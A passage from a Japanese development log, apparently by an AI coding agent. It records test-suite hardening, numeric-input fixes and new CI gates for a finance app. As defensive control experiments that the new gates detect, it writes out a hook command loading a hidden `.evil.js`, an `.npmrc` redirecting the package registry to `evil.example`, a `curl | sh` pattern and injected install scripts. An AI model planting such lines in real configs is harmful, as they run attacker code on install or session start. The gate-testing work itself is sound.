で切って読んでいた)、最後の `assert` で止まって**ファイルは書かれなかった** (緑のまま素通りしなかったのは、書き込みの前に `await settle();` が 0 件であることを確かめていたから)。**母集団を目で数えたら、数えた所までしか直っていない。**検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 10 本 / 88 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,963** (`it()` は 1 つも増減していない)・`verify:all` exit 0。**残り 10 本**: `setup-flush` 7 / `text-captured` 2 / `text-with-message` 1 ——「`text-captured` 2」は`investmentDemoMixOnScreen` と `manualOverrideDisclosure` で、どちらも別の手が要る)・**2026-09-21 パス 380 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 4 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **17 → 14 本**へ消化し、**`store-roundtrip` の分類を空にした** (`ParametersPanel.render` / `mutualFundsDoubleSubmit` / `shopifyDuplicateOrder`)。★ **台帳の `why` が「道具の限界」を理由にしていた** —— 3 本とも「IndexedDB の往復。解決が `act` の外なので、条件で待つには**非同期の述語**が要る (共有の待ちは同期の述語しか取らない)」と書いてあった。**限界は直せるので直した** —— `jsdomWait.ts` に `settleUntilAsync` (述語を `act` の中で `await` する) を足した。★ **ところが、足してみると要らない場面のほうが多かった** —— 保管層への書き込みは**画面に出る** (`useCollection` が購読している) ので、DOM の印で待てる。`ParametersPanel` は 11 件すべてが DOM の印で足り、`save()` は「同じ値になったので保存ボタンが押せなくなる」= **件数が変わらない保存でも効く印**を使う。非同期の述語が本当に要ったのは `shopifyDuplicateOrder` の対照 (同じ金額を 4 件記録するので文面では区別できない) と `mutualFundsDoubleSubmit` の対照だけだった。★ **いちばん重い発見: 「N 件になるまで待って N 件」は偽陽性になりうる** —— `mutualFundsDoubleSubmit` の ★ は「2 度押しても 1 件」という**増えないことの主張**で、そこに `settleUntilAsync(=== 1)` を書くと**関門が壊れていても 1 件を見た瞬間に通る** (2 件目は後から来る)。錠は「1 件目が画面に出た」= 保存が解決して一覧が描き直された印にし、件数の主張はその後に置いた。**そして実際に対照を回して確かめた**: `useSubmitGuard` の `if (inFlight.current) return false;` を消すと **`expected 2 to be 1` で落ちる** —— 寄せた形は偽陽性になっていない。`ParametersPanel` の対照 (保存を no-op に) は **8 件落ちる**。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 14 本 / 92 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,963** (`it()` は 1 つも増減していない)・`verify:all` exit 0。**残り 14 本**: `setup-flush` 7 / `text-captured` 2 / `mock-call` 2 / `hook-state` 1 / `attribute` 1 / `text-with-message` 1)・**2026-09-21 パス 379 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 3 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **20 → 17 本**へ消化し、**`text-helper` の分類を空にした** (`overviewBankSheet` / `refusedSave` / `taxPageMethodAvailability`)。この家系の特徴は **読むのが helper で、`expect(…)` の行に `textContent` の綴りが 1 字も無い**こと —— パス 368 の綴りの針が最後まで見落とした形である。直し方は 1 つ: **その helper をそのまま述語として `settleUntil` へ渡す** (`() => q.cell('売上高') === '12,345,678'` / `() => says(SAVED_LINE)`)。★ **錠を「主張そのもの」に置けない場面が在った** —— `taxPageMethodAvailability` の 0 周の失敗 2 件は **`seed()` した上書きが IndexedDB から届いていない**ことが原因で、画面は既定のしきい値のままの答え (簡易課税) を返す。ところが `recommended()` で待つと**待ちが主張を飲み込む** (その `it` が確かめたいのはまさにその値である)。届いた印は**別に在った** —— 「簡易課税（基準期間の課税売上¥5,000,000超）」という**外した理由の文**で、上書きを使う 2 件はそれを先に待つ 2 段にした。同じ理由で `chooseEntity` は「現在 法人」を待つ。★ **対になる待ちが無い側は、無いと書いた** —— `refusedSave` の**断られる**場面には待てる印が無い (断りの文 `[data-refused-fields]` は押す前から出ているので、それを待っても「押した結果」を待ったことにならない)。断りの側の主張は**記録そのもの** (`storedSetups()`) で、非同期の読みなので待たずに聞ける —— 押す仕組みが生きていることは同じファイルの ★ 対照が保つ。**無い物を在るように見せる待ちは足さない。**★ **ついでに二重 mount を 1 つ消した** —— `overviewBankSheet` の NaN の検査は `mountOverview()` の後に `openSheet()` を呼んでおり、`openSheet()` 自身がもう 1 度 `createRoot(container)` していた (同じ器に 2 つの木が載り、`q.cell` がどちらを読むか綴りからは決まらない)。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 17 本 / 95 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,963** (`it()` は 1 つも増減していない)・`verify:all` exit 0。**残り 17 本**: `setup-flush` 7 / `store-roundtrip` 3 / `text-captured` 2 / `mock-call` 2 / `hook-state` 1 / `attribute` 1 / `text-with-message` 1)・**2026-09-21 パス 378 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 6 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。台帳を **25 → 20 本**へ消化し、**`element-presence` の分類を空にした** (`docstudioImport` / `kpiDuplicateActuals` / `sensitivityMarginOnScreen` / `settingsUnreadableCards` / `teamDuplicateMember`)。パス 376・377 は**文**を錠にしたが、この 5 本の主張は「要素が在るか」「行が何本か」なので、錠も **`waitForElement` か、数える述語を渡す `settleUntil`** にした ——`mount(rows)` / `mount(id, ready, label)` / `mountOverview(ready, label)`。★ **固定回数が効いていたのは待ちだけではなかった** —— `click` / `clickButtonExact` は押した**後**にも `settle()` を持っていた。押した後に何が出るかは `it` ごとに違うので、**押す側は押すだけにして、待つのは呼び手が自分の見たい物で待つ**形にした (kpi と team は「一覧が n 行になる」、docstudio は「件を取り込みました」)。★ **0 周にすると本文が 1 度も走らない `it` が 1 本在った** —— `sensitivityMarginOnScreen` の「★ 同じ行の営業利益は赤字の額をそのまま出す」は `for (const r of rows)` だけで主張するので、**表が空なら何も当てずに緑になる**。行数の錠がその空回りも塞ぐので、明示の `expect(rows.length)` も併せて置いた。★ **「件数が増えていない」を押した直後に見ていた 2 本を 2 段にした** (`kpiDuplicateActuals` / `teamDuplicateMember`) ——重複の追加を断る検査は `clickButtonExact('追加')` の直後に `expect(await countActuals()).toBe(1)` を置いていたが、**何も起きていなければそれは当たる**。断りの文を先に待ってから件数を見る順序へ入れ替えた (パス 377 と同じ形)。★ **台帳の床を 20 → 10 へ下げた** —— `tickSensitivityLedger.test.ts` の `expect(rows.length).toBeGreaterThanOrEqual(20)` は「針が死んでいない」ことだけを言う床なのに、実測の行数に張り付いていた。台帳は消化するたびに短くなるので、そのままだと**直した日に落ちる門**になり、「減らすのが正しい向き」と真逆の圧力をかける (上限の側は `fixedTickAssertionCensus.test.ts` が別に持つ)。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 20 本 / 98 本で、台帳どおり (双方向)** (母集団も 103 → 98 本へ —— 固定回数の待ちを 1 つも持たないファイルは走査から外れる)。`typecheck` 緑・`npm test` **805 / 17,963** (`it()` は 1 つも増減していない)・`verify:all` exit 0。**残り 20 本**: `setup-flush` 7 / `store-roundtrip` 3 / `text-helper` 3 / `text-captured` 2 / `mock-call` 2 / `hook-state` 1 / `attribute` 1 / `text-with-message` 1)・**2026-09-21 パス 377 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 3 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。台帳を **28 → 25 本**へ消化 (`budgetPeriodScopeVisible` / `undefinedRatiosOnScreen` / `realEstateYieldScope`)。パス 376 で確立した形をそのまま適用: **mount の helper に `waitFor` を取らせ、固定回数の代わりに条件で待つ**。錠は**その `it` が真に見たい値**にし、否定だけの `it` は**肯定の前提を先に待つ 2 段**にする。★ **錠を置く先は画面ごとに違う** —— `realEstateYieldScope` はどの主張もポートフォリオの範囲の箱 (`[data-portfolio-scope]`) か一覧の行を見るので、全文ではなく**その箱の文**を読む形にした。検証は `npm run audit:tick-sensitivity` で実測: **0 周で落ちるのは 25 本 / 103 本で、台帳どおり (双方向)**。`typecheck` 緑・`npm test` **805 / 17,963**・`verify:all` exit 0。**残り 25 本**: `setup-flush` 7 / `element-presence` 5 / `store-roundtrip` 3 / `text-helper` 3 / `text-captured` 2 (`investmentDemoMixOnScreen` は marker ごとの注記を 10 か所で読み、`manualOverrideDisclosure` は操作の後にも `settle()` を持つので別の手が要る) / `mock-call` 2 / `hook-state` 1 / `attribute` 1 / `text-with-message` 1)・**2026-09-21 パス 376 後も 11,935,880 B / 3,348,401 B で byte 単位で不変** (直したのは `__tests__/` 3 本と `scripts/audit-tick-sensitivity.cjs` の台帳だけ —— **どちらも出荷物に入らない**。両方を組んで実測した。パス 369 の台帳 (0 周で落ちる 31 本) を **31 → 28 本**へ消化した。寄せた 3 本はどれも `text-captured` —— `固定回数の settle() → const t = text(); → expect(t).toContain(…)` という、**取る前に回数で待つ**形である。直し方は 1 つ: **mount の helper に `waitFor: string` を取らせ、固定回数の代わりにその文が出るまで待つ** —— 取った後の主張 (否定を含む) はそのままでよい。否定だけの `it` は**肯定の前提を先に待つ 2 段**にした (台帳の `text-with-message` の行が名指していた形)。★ **針を 2 度直した** —— ① 変換の正規表現を `i < 8` で書いたが、`balanceSheetInsightsOnScreen` は `i < 6` だった (**回数はファイルごとに違う**ので回数に依らない形へ)。② 最初は**ラベル**を錠にしたが、`ネットデット` は出ていても `30%` はまだで 1 件落ちた —— **ラベルは先に出て、算定された値は後から来る**ので、錠は**その it が真に見たい値**にする。検証は `npm run audit:tick-sensitivity` で実測: **落ちたファイルは台帳どおり (双方向)**で、寄せた 3 本は 0 周でも落ちない。★ **この日の他の 5 つの探りは何も見つからなかった** (実測): ① **内蔵サンプルのバッジ** —— `sample` の 40 画面を jsdom で描いて **36 がバッジを出す**。出ない 4 つは正しい (`charts` は「仮想データを流して」と自分の言葉で言い、`sales` / `team` / `overview` は**利用者自身の記録**を描く)。バッジを消すと **12 件 / 3 ファイル**が鳴る。② `isMock` を名乗るべき 3 クライアント (funding / stocks / kpi) は全部立てており、`useServiceData` が構造で拾う。③ **CSV の数式インジェクション** —— 3 つの書き出しが全部 `toCsv` → `guardFormula` を通り (トリガーは `= + - @ \t \r`)、手書きの `join(',')` を植えると `csvExportGate.test.ts` が鳴る。★ **ここで私は一度「`text/csv` の census は無い」と述べ、それは偽だった** —— 検査ファイルを `text/csv` の綴りで grep して 0 件と結論したが、実物の門は **mime ではなく「行を自分で組み立てている形」で母集団を採る**ので、その針には映らない。植えて測って初めて分かった (綴りベースの針が取りこぼした **3 度目**)。④ **24 語をクリップボードへ** —— 30 秒の守りつき自動消去を外すと**専用の検査 2 件 + 整合性チェーンの外側の証人**が鳴る (`LockScreen.tsx` は保護対象)。⑤ `orchestration/` は `lint:forbidden` の `SCAN_ROOTS` に入っている (min 2)。**測って何も無かったことも記録する**)・**2026-09-21 パス 375 後の計測: 11,935,880 B / 3,348,401 B (両方 −584 B** —— 入力欄を数にする口を 3 つ塊いだ分。**減るのは、塊いだ側が自分の正規表現と写しを持っていたため** (`serviceActionUtils` の `toHalfWidth` と厳格な 10 進数の式・`eligibility` の全角化とカンマ除去・`TaxPage` の useMemo 3 つが 1 行ずつに)。`renderer` / `shared` は両ビルドが読むので LITE も同じだけ減る。**`shared/readNumeric.ts` が名乗る「入力欄の文字列を数にする口は 4 つあり、全部ここを通す」は偽だった** —— 数値入力 (`inputMode` を持つ `<input>` と `<GuardedNumber>`) を走査すると **13 ファイル / 119 欄**で、そこから読み手を辿ると通らない口が **3 つ / 呼び出し 7 か所** —— `parseAmountInput` (TaxPage ×3 / WelfareSchemeCard / ServiceActionPanel)・`parseNumericInput` (EligibilityChecker ×2)・`OverviewPage` の素の `Number()` (目標利益)。★ **いちばん重いのは `TaxPage` で、同じ画面が関門と計算で別の読み手を使っていた** —— 61 か所を `readNumber` (= `readNumeric`) で読み、**関門 (`guardAll` → `GuardSummary`) もその読み手で判定する**のに、①課税所得 / ②額面年収 / 目標手取りの 3 欄だけが `parseAmountInput` だった。しかも**同じファイルの 275 行目に「読み取りは inputGuards に統一し、下の GuardSummary と同じ関数で判定する」と書いてあった** (統一したと述べたまま 3 欄が残っていた)。実測 (26 標本中 **11 で不一致**): `'5,000,00'` → readNumeric **null** / parseAmountInput **500000**・`'500円'` → **500** / **断る**・`'30 000'` → **null** / **30000**・`'1 2 3'` → **null** / **123**。★ **関門の文面が両方向に嘘になる** (jsdom で実測し、その 2 件を機械にした): 課税所得に `'5,000,00'` を打つと画面は ⛔「**読み取れなかった欄は 0 として計算されています。下の数字はその前提の値です**」と断りながら **所得税 ¥25,525** (= parseAmountInput が読んだ 500,000 の税) を出し、逆に `'5,000,000円'` は **⛔ が 1 つも出ずに所得税 ¥0** —— **関門が「問題ありません」と保証した欄を、計算は捨てていた**。**直しは呼び出し側 7 か所ではなく口を塊ぐ** —— `parseAmountInput` / `parseNumericInput` の**中身**を `readNumeric` へ委ね (返り値の形は各々の呼び手が要るので変えない。`AmountParse` は「未入力」と「読めない」を分けたまま)、`TaxPage` は局所の `num` を**モジュール直下へ出して** 3 欄もそれで読む (元の場所だと TDZ で呼べず、**それが 3 欄だけ別の読み手になっていた理由そのもの**だった)。これで**どちらの向きにも緩くならない**: `'1,23'` / `'30 000'` / `'1e3'` / `'0x10'` / `'.5'` は断るようになり、`'500円'` / `'50%'` は読めるようになる。母集団は `numericInputReaderCensus.test.ts` (11 件) が**走査で導いて**読み手の台帳と**両方向**に突き合わせる。★ **最初に書いた走査は母集団の 1/3 を見ていなかった** —— `<input\b[^>]*?>` で切っていたので `onChange={(e) => …}` の**矢印の `>`** で切れ、`inputMode` がその後ろに在る欄が丸ごと映らなかった (EligibilityChecker と ServiceActionPanel は **0 件**・RealEstatePage は 13/17)。波括弧の深さを数える形に直し、**その形の標本**を置いた (パス 334 / 348 と同じ家系)。対照 **6 方向すべて鳴る**: `parseAmountInput` を戻す ❌1 / `OverviewPage` を `Number()` へ ❌2 / `parseNumericInput` を戻す ❌1 / 台帳から 1 行消す ❌1 / 台帳に無い読み手を足す ❌2 / 針を素朴な形へ戻す ❌2。★ **弱さを仕様として留めていた既存の検査 2 件を直した** —— `serviceActionUtils.test.ts` は `'12 000'` → 12000 と `'1\t200'` → 1200 を「仕様」として持っていたが、それは `readNumeric.ts` が 2026-09-06 に**欠陥として実測した形** (「桁区切りの空白」と「2 つの数」を区別できない) である (法則 `no-weakness-as-spec`)。断る側へ倒し、**前後の空白は今までどおり落とす**ことも留めた。法則 `center-then-count-callers` に執行者を 1 つ足した。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 170 ms / heap 10.3 MB・FULL DCL 446 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-21 パス 374 後の計測: 11,936,464 B / 3,348,985 B (両方 +692 B** —— 法人税・消費税の 5 欄を共有の読み取りへ通し、読めなかったときの ⛔ を 1 行出すようにした分。`renderer` は両ビルドが読むので LITE も同じだけ増える。**`shared/readNumeric.ts` が「口は 4 つあり全部ここを通す」と述べている外に、5 つ目が在った** —— `FinancialAnalysis.tsx` の資本金 / 従業者数 / 繰越欠損金 / 課税売上 / 課税仕入は `parseFloat(x.replace(/,/g, ''))` で直接読んでいた。`parseFloat` は**読めた所まで読んで残りを捨てる** (実測: `'1億'` → **1**・`'1000万'` → **1000**・`'12abc'` → **12**・`'12.5.6'` → **12.5**。`Number` はどれも NaN)。下流の `isFinite` と `Math.max(0, …)` は **1 が有限で非負**なので素通りさせる。法則 `center-then-count-callers` の形である。★ **到達可能性を最初に取り違え、検査を書いて落ちたことで気付いた** —— 私は「**「1億」と打つと資本金 1 円として法人税を計算する**」と書いたが、**それは偽**だった。この 5 欄は `type="number"` で、ブラウザ (と jsdom) が数字でない字を捨てるので `'1億'` は state まで届かない (実測: jsdom で `type=number` の `value` に `'1億'` を入れると `''`・`type=text` なら `'1億'`)。**穴を塞いでいたのは読み取りではなく入力欄の型**で、アプリの他の **62 の数値欄は `type="text" inputMode="decimal"`** —— **揃える編集を 1 つ入れた瞬間に生きる形**だった (資本金 1 億円は外形標準課税と均等割の区分が変わる境目なので、生きれば税の区分ごと変わる)。直しは 2 つを同時に: ① 読み取りを共有の 1 つ (`readNumberOrNull`) へ ② 入力欄を他の 62 欄と同じ形へ。これで読めない入力は**捨てられるのではなく ⛔ として見える** (文面は `guardNumber` が既に持っていた「単位付きのため読み取れません」—— `type="number"` のままだとその文は**構造的に出せない**)。母集団は `financialAnalysisNumberReading.test.ts` (7 件) が**両方向の台帳**で持つ (今 1 件: `chatCalc.ts` は**先に正規表現で数字だけを切り出す**ので途中で切れる余地が無い)。注記の中の言及は `codeOnly()` で落とす。対照 3 方向とも鳴る: `parseFloat` へ戻す ❌1 / ⛔ の描画を潰す ❌2 / `type=number` へ戻す ❌2。★ **閉じていない物 (測った)**: 素の数値入力は全体で **67 か所 / 12 ファイル**、`GuardedNumber` は 6 ファイル 61 か所。**どちらが正しいかはファイルごとに読まないと決まらない**ので、分母だけ数えて「62 か所が無防備」とは書かない。次に読むなら `TaxPage.tsx` (素 34 / 守り 15 の混在) が最大。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 178 ms / FULL 446 ms)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-21 パス 373 後の計測: 11,935,772 B / 3,348,293 B (両方 +4,056 B** —— 水耕栽培の運転設定 18 欄に**入力できる幅**を足した分 (日本語のラベルと幅の台帳 `CONTROL_FIELD_BOUNDS`)。`shared` / `renderer` は両ビルドが読むので LITE も同じだけ増える。★ **`why` (なぜこの幅か) は出荷物に入る** —— docblock と違い**値**なので最小化で落ちない。**見つけた物**: 画面は 18 欄を**素の `<input type="text">`** で出し、**ラベルは生の鍵名** (`waterTempLowC` / `tankLiters` …) のままだった (日本語の画面でここだけ英字)。保存側の検査は `parseControlRecord` の 3 つだけで、`req` (目標域 10 + 残アルカリ度) は**有限なら何でも通り** (負も可・上限なし)、`optNum` (調製 4 欄) は `> 0` だけ、`days` (3 欄) は 1 以上の整数だけ —— **どれも上限が無い**。効いていたのは `relationIssue` の「下限 ≦ 上限」だけなので `co2HighPpm: 1e9` も低≦高を保てば保存される。実測: `topUpLiters(1, { …, tankLiters: 1e12 })` → **`{ kind: 'top-up', liters: 990000000000, why: '液位 1% を満水まで戻す量です…' }`** —— **桁を 1 つ多く打っただけの値が、自信のある指示として出る**。酸を量る指示も同じ経路で、`.cursor/rules/30-conventions.mdc` が自分で名指ししている「打ち間違いがそのまま自信のある間違った答えになる」形であり、しかも**物理的に手を動かす指示**である。**直し**: ① 幅は `CONTROL_FIELD_BOUNDS` **ただ 1 つ**で、目標域 10 欄は **`READING_FIELD_SPECS` から導く** (同じ項目の「測った値として有り得る幅」と「目標として入れてよい幅」は同じ —— 数を 2 度書かない)。調製 5 + 日数 3 は「桁誤りを止める幅」として理由つきで新設し、**適正域ではない**ことを `why` に書く ② 画面を `GuardedNumber` + 日本語ラベルへ。⛔ が 1 つでも在れば**保存しない** (パス 214 —— 判定は出し直せるが保存した値は残り、以後すべての指示がそれを読む) ③ **読み側も同じ幅を通す** (`readControlRecord`) —— 入口だけ締めるとパス 359 が名指しした「入口が出口より厳しい」非対称になり、古い保存値や復元で入った桁違いがそのまま指示になる。幅の外は既定 (調製は `null`) へ倒し、**倒したことを画面が言う** (パス 225 / 360 と同じ形) ④ `inputGuards.ts` に単位 5 種 (`celsius` / `liters` / `ppmAir` / `normality` / `ecRise`) を新設 —— **近い kind を借りない** (単位語は「0 X として計算されています」の文面に出るので、借りると嘘の単位を言う。同ファイルが既に days / energy / mgPer100g を同じ理由で足している)。一致は `unitOfKind` と突き合わせて留める。対照 3 方向とも鳴る: 保存の ⛔ を外す ❌1 / 幅の判定を潰す ❌4 / 生の鍵名ラベルへ戻す ❌1。★ **自戒: 検査は通るのに型が通らない形を書いた** —— `waitForElement<HTMLButtonElement>(() => q('…'))` と型引数を外側に付けたため `q()` が `Element` を返し、**vitest は型を剥がすので 4 件とも緑**で `npm run typecheck` だけが 4 件の誤りを出した (CLAUDE.md が「型の誤りを捕まえる網はこれ 1 つ」と書いている当のこと)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 160 ms / heap 10.3 MB・FULL DCL 439 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-21 パス 372 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `.cursor/rules/` 2 本の数字と `scripts/` 2 本・`__tests__/` 1 本・オントロジー・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**エージェントへ常時注入される指示書が 24 ゲート分古かった** —— パス 370 / 371 で法則 `config-that-picks-code-is-guarded` が 4 件出たので、勘で探すのをやめて**追跡されている設定ファイル 28 本**を「鎖に在るか」で並べた。コードを選ぶ側 (`package.json` / workflows / `stryker.config.json` / `tsconfig*.json` / `electron-builder.json`) は**どれも門か鎖のどちらかが触っていた** —— 触られていなかったのは**別の家系**、`.cursor/rules/*.mdc` **4 本**だった。★ `20-gates.mdc` は `alwaysApply: true` (Cursor の**全セッション**に注入される) で、`npm run verify:all` を **「13 ゲート全部」**と書いていた —— **実物は 37**。**皮肉なことに、その 3 行下で同じファイルが「`verify:all` にゲートを足したら `ci.yml` にも足すこと」「これを怠るとゲートは存在するのに何も守っていない状態になる」と正しく述べている** —— **規則は知っていたのに、自分の数は誰も見ていなかった。** もう 1 つ: `00-project.mdc` は `build:web:lite` を「約 2.2MB」と書いていた (実測 **3,344,237 B ≒ 3.2MiB**) —— LITE の天井は 4,000,000 B・警告線 3,400,000 B なので、2.2MB を前提に読むと**余裕を 1.1MB 過大に見積もる**。**同じ木の中で `00-project.mdc` のサービス数 (76) だけは `lint:docs` が 2026-08 から見ていた**。直しは ① 2 つの数を実測へ ② `verify:arch` に **42 本目のライブメトリクス** (`.cursor/rules: verify:all gate count`・対照: 13 へ戻すと `doc says 13, source says 37` で鳴る) ③ `.cursor/rules/*.mdc` 4 本を**整合性チェーンへ** (保護対象 84 → **88**・block **#251**。数の古びはメトリクスが塞いだので、鎖が見るのは**散文そのものが変わったこと** = 機械には判断できない「指示の中身」の側。安定資産の基準も満たす —— 2 / 1 / 1 / 1 コミット) ④ `agentInstructionFiles.test.ts` (7 件) が母集団を走査で導き方針の台帳と双方向に (`chain` / `live-metrics`。方針は **churn** で決まる —— `CLAUDE.md` は 183 コミットなので鎖ではない)。★ **測って何も無かったことも記録する**: `.mdc` の他文字種の混入は `lint:charset` が既に見ている (実測: キリル文字を植えると exit 1) ので**同じ事実を 2 つの門で見ない**・workflows 7 本は `lint:workflow-security` が全部見る・`stryker.config.json` / `tsconfig*.json` / `orchestration/registry.json` はそれぞれ既に門が触っている)・**2026-09-21 パス 371 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `scripts/` 1 本と `__tests__/` 1 本・オントロジー・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**`npm ci` の時点で走る「自分の」コードが無縛だった** —— `lint:deps` の規則 3 は「`npm ci` の時点で任意のコードが動くので危険度は高い」と**正しく述べている**のに、見ていたのは lockfile の `hasInstallScript` = **依存の側**だけで、**このリポジトリ自身の `package.json` の lifecycle script** は誰も見ていなかった。★ **実測 (2026-09-21)**: 空の package.json に `postinstall` と `prepare` を置いて `npm ci` を回すと**どちらも走った** (印のファイルが残る)。つまり 1 行足せば CI の `npm ci`・**`release.yml` の梱包ジョブ (署名鍵 4 本と `GH_TOKEN` を env に持つ)**・全員の手元で走る。対照 (同日実測): それを足し `.npmrc` に `registry=https://evil.example/` を書いても **`verify:all` の 37 ゲートすべてが exit 0**・`chain:verify` も exit 0。`.npmrc` は lockfile の `resolved` が効かない経路 —— **`npx -y` で走る MCP サーバ 25 件がまさにそれ** —— の取得元を丸ごと替え、`.pnpmfile.cjs` は**インストール時に走る任意のコード**そのものである。パス 370 と同じ法則 `config-that-picks-code-is-guarded` の **4 件目**。直しは `lint:deps` に規則を 2 本 (7 → **9 本**): **規則 8** = 自分の lifecycle script 8 種が理由つきの台帳と双方向 (今日 **0 件**)・**規則 9** = インストール時に読まれる設定 5 種が台帳と双方向 (今日 **0 件**)。**`package.json` は鎖には入れない** —— 全履歴 **12 コミット**で「安定資産」の基準 (パス 347) を満たさないので門で形を見る (パス 370 の `.claude/settings.json` は 1 コミットだったので鎖へ入れた)。実物は `installTimeCodeGuarded.test.ts` (6 件) が門の関数を借りて留める。対照 2 方向とも鳴る。★ **自戒: 私が書いた self-test は、落ちたら例外になる形だった** —— case を `selfTest()` の**先頭**に入れたが、カウンタ `let bad = 0` は**その 140 行下**に在り、全部通っている間は `bad++` に到達しないので緑になる。**1 件でも落ちた瞬間に `ReferenceError` (TDZ) で死ぬ** = 「落ちたときに落ちない検査」だった。`eslint` の `no-useless-assignment` が症状だけを鳴らして気付いた。宣言の後ろへ移し、**わざと 1 件落として ✗ が印字されること**を確かめた)・**2026-09-21 パス 370 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `scripts/` 2 本と `__tests__/` 1 本・オントロジー・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**セッション開始のたびに走るコマンドを、どのゲートも読んでいなかった** —— `.claude/settings.json` は追跡されている設定で実行面を **2 つ**持つ (`hooks.SessionStart[].hooks[].command` = Claude Code が起動のたびに実行する / `mcpServers` 25 件 = `npx -y` / `uvx` で「その時の最新」を取って走らせる)。`lint:mcp-servers` は 2026-08-25 から**このファイルを開いていた**のに、読んでいたのは `json?.mcpServers` **だけ**だった。★ **対照 (実測)**: hook のコマンドを `node -e "require(process.env.HOME+'/.evil.js')"` に替えると **`verify:all` の 37 ゲートすべてが exit 0**・`chain:verify` も exit 0・`npm test` も緑。**走る側は守られていた** (`scripts/session-context.cjs` は `lint:forbidden` の走査対象で、子プロセスを作る例外まで台帳に載っている) —— 守られていなかったのは**どの script を走らせるかを決める側**で、パス 347 (`vite.config.ts`) とパス 349 (`docs/PROXY_EXAMPLE.md`) と同じ「**守る順番の逆転**」である。直しは ① 門をファイル全体へ (hook のコマンドは**リポジトリ内の Node script ただ 1 つ**の形だけ = `node scripts/<name>.cjs`・シェルの一行と `curl | sh` と `npx` は**形で落ちる**・指す script の実在も見る・台帳と双方向) ② **最上位の鍵を閉じた (fail closed)** —— 設定は `statusLine` など別の実行面を後から増やせるので、「見る鍵を挙げる」形だと 3 つ目が静かに入る ③ `.claude/settings.json` を**整合性チェーンへ** (保護対象 83 → **84**・block **#249**。門は**形**を見て鎖は**変わったこと自体**を見るので別の仕事。安定資産の基準も満たす —— 全履歴 **1 コミット**)。実物がその規則の下に居ることは `sessionStartCodeGuarded.test.ts` (6 件) が門の `evaluate` を借りて留める (`lint:mcp-servers` が CI から外れても鳴る)。対照 3 方向とも鳴る: `node -e` ❌ / `curl | sh` ❌ / `statusLine` を足す ❌。法則 **94 本目** `config-that-picks-code-is-guarded`。★ **この作業中に私の散文が 3 回ゲートに捕まった** —— 法則の statement と 2 つの docblock に禁止の綴りをそのまま書いたため (パス 347 と同じ)。言い換えた。**注記の中でも鳴るのは正しい** —— 走査は綴りしか見ないので、例外を作るとそこが穴になる)・**2026-09-21 パス 369 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `__tests__/` 80 本と `scripts/` 2 本・文書だけ —— **どれも出荷物に入らない**。両方を組んで実測した。**頼まれた仕事は「残りの 32 本を共有の待ちへ寄せる」で、それは終わった** (針を HEAD と突き合わせて主張を 1 つも落としていないことを確かめた)。★ **ところが寄せ終えて「本当に回数に依らなくなったか」を測ったら、パス 368 で私が書いた針が両方向に外れていた。** 固定回数の `settle` を持つ 109 本すべての周回数を 0 にして走らせた実測: **見落とす側** —— 針の第 2 枝は `expect\(text\)\.toContain\(` で**裸の識別子**しか見ず、このリポジトリで最も多い形 `expect(text()).toContain(…)` (**HEAD で 67 ファイル / 363 か所**) を 1 件も見ていなかった。第 1 枝の `[^)]*` は**入れ子の括弧を跨げない**ので `expect(q.sheet()!.textContent).toContain(…)` も見えず、matcher が `toContain` だけなので `expect(el?.textContent).toBe('確認できません')` も、読むのが helper の `expect(q.cell('売上高')).toBe(…)` も見えない。**数えすぎる側** —— 条件で待った**あと**の `expect(…).toContain(…)` はもう当て物ではないのに区別できず、さらに `USES_SHARED_WAIT` は**ファイル単位の免除**なので 1 か所寄せるとそのファイルの残りが見えなくなる。パス 334 が名指しした「**その関数を使っている場所ではなく、同じことをしている場所を数えろ**」の形である。★ **だから測る側を綴りから振る舞いへ移した** —— 知りたいのは「この主張は settle の回数に依っているか」で、それは**回数を 0 にして走らせれば直接答えが出る**。`npm run audit:tick-sensitivity` (`scripts/audit-tick-sensitivity.cjs`・**定期点検の道具 3 本 → 4 本**) が 109 本の周回数を 0 に書き換えて走らせ、**必ず元へ戻し** (`finally` + 内容で照合)、落ちたファイルを理由つきの台帳と**双方向**に突き合わせる。パス 356 の `audit:survivors` と同じ家系 (静的な報告が偽だったので、報告ではなく当て直して確かめた)。**CI では走らせない** (ソースを書き換えるし、落ちること自体は欠陥ではない)。実測と直した分: **0 周で落ちるファイル 34 → 31 本**・**共有の待ちを import する検査 19 → 97 本**・**`await waitForText` / `waitForElement` 25 / 16 → 397 / 34**・広げた針での危ない形 **0 本**・手書きの待ちの台帳 **6 → 3 本** (`restorePassphraseField` / `backupPassphraseFloor` の 20 秒の待ちは**上限を渡す形**で寄せられた 